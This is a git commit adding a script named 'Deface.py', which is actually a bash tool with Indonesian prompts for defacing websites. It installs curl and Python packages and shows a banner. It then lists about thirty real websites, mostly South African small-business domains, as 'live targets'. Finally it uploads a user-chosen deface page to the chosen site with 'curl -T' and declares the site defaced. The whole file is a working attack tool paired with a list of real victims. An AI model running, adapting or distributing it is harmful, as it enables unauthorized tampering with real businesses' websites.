01d9fd733a1b0c377656e4cda8c343dbce5df6d7
randioloyy <51774056+randioloyy@users.noreply.github.com>
2019-08-09 20:57:32 +0700

    Deface.py

---
+++ Deface.py
@@ -0,0 +1,75 @@
+#usr/bin/bash
+clear
+bi='\033[34;1m' #biru
+i='\033[32;1m' #ijo
+pur='\033[35;1m' #purple
+cy='\033[36;1m' #cyan
+me='\033[31;1m' #merah
+pu='\033[37;1m' #putih
+ku='\033[33;1m' #kuning
+apt install openssl curl
+clear
+pkg install libcurl
+clear
+pip install curl
+clear
+pip2 install urllib3 chardet certifi idna requests
+clear
+echo
+echo $me"####################["$cy"WELCOME"$me"]#######################"
+echo $me"#"$i"  888                     888                     "$me" #"
+echo $me"#"$i"  888                     888                     "$me" #"
+echo $me"#"$i"  888                     888                     "$me" #"
+echo $me"#"$i"  88888b.  8888b.  .d8888b888  888 .d88b. 888d888 "$me" #"
+echo $me"#"$i"  888 *88b    *88bd88P*   888 .88Pd8P  Y8b888P8   "$me" #"
+echo $me"#"$i"  888  888.d888888888     888888K 88888888888     "$me" #"
+echo $me"#"$i"  888  888888  888Y88b.   888 *88bY8b.    888     "$me" #"
+echo $me"#"$i"  888  888*Y888888 *Y8888P888  888 *Y8888 888     "$me" #"
+echo $me"####################################################"
+echo $me"#"$pu" SIMPAN SCRIPT DEFACE LU DI PENYIMPANAN CUK       "$me" #"
+echo $me"#"$pu" INTERNAL LALU KASIH NAMA SCRIPT DEFACE KAMU CUK  "$me" #"
+echo $me"#"$pu" MENJADI index.html {KALAU  SUDAH KITA LANJUT CUK "$me" #"
+echo $me"#"$pu" MY TEAM   : SMK IGASAR PINDAD                    "$me" #"
+echo $me"#"$pu" AUTHOR    : ./16122003                           "$me" #"
+echo $me"#"$pu" THANKS TO : MR.NEWBIE3X - RANDIOLOY              "$me" #"
+echo $me"####################################################"
+sleep 3
+echo
+echo $cy"::::::::::::::::::::::::::::::::::::::::::"
+echo $cy":"$ku"         LIVE TARGET CUK"$cy"                :"
+echo $cy"::::::::::::::::::::::::::::::::::::::::::"
+echo $cy":"$pu" http://contsol.co.za/"$cy"                  :"
+echo $cy":"$pu" http://colourfactory.co.za/"$cy"            :"
+echo $cy":"$pu" http://chillibitez.co.za/"$cy"              :"
+echo $cy":"$pu" http://chasingfantasia.com/"$cy"            :"
+echo $cy":"$pu" http://centraltech.co.za/"$cy"              :"
+echo $cy":"$pu" http://cblandscapes.co.za/"$cy"             :"
+echo $cy":"$pu" http://bee-it.co.za/"$cy"                   :"
+echo $cy":"$pu" http://butterflowers.co.za/"$cy"            :"
+echo $cy":"$pu" http://bananabox.co.za/"$cy"                :"
+echo $cy":"$pu" http://ayk.co.za/"$cy"                      :"
+echo $cy":"$pu" http://ads247.co.za/"$cy"                   :"
+echo $cy":"$pu" http://allpaint.co.za/"$cy"                 :"
+echo $cy":"$pu" http://atlanticphysio.co.za/"$cy"           :"
+echo $cy":"$pu" http://valdicare.co.za/"$cy"                :"
+echo $cy":"$pu" http://vmicl.co.za/"$cy"                    :"
+echo $cy":"$pu" http://moneyin1week.co.za/"$cy"             :"
+echo $cy":"$pu" http://mix007.co.za/"$cy"                   :"
+echo $cy":"$pu" http://mediacube.co.za/"$cy"                :"
+echo $cy":"$pu" http://megro.co.za/"$cy"                    :"
+echo $cy":"$pu" http://menogold.co.za/"$cy"                 :"                                                                               echo $cy":"$pu" http://mestern.co.za/"$cy"                  :"
+echo $cy":"$pu" http://tcmgroup.co.za/"$cy"                 :"                                                                               echo $cy":"$pu" http://sublimeconfectionery.co.za/"$cy"     :"
+echo $cy":"$pu" http://tieronecapital.co.za/"$cy"           :"                                                                               echo $cy":"$pu" http://thegiftstore.co.za/"$cy"             :"
+echo $cy":"$pu" http://thefoundation.co.za/"$cy"            :"
+echo $cy":"$pu" http://tressor.co.za/"$cy"                  :"
+echo $cy"::::::::::::::::::::::::::::::::::::::::::"
+sleep 2
+echo $pu                                                                                                                                     read -p"<===// MASUKAN NAMA SCRIPT DEFACE MU CUK : " script
+echo
+echo
+read -p"<===// PASTEKAN SALAH SATU WEB DI ATAS CUK : " target
+curl -T /storage/emulated/0/$script $target
+echo
+echo
+echo $cy"["$pu"√"$cy"]"$pu" WEB TELAH TERDEFACE CUK "$cy"["$pu"√"$
+echo $bi"[*] SILAHKAN DICEK SAYANG"$KU" ===>"$pu $target$script+
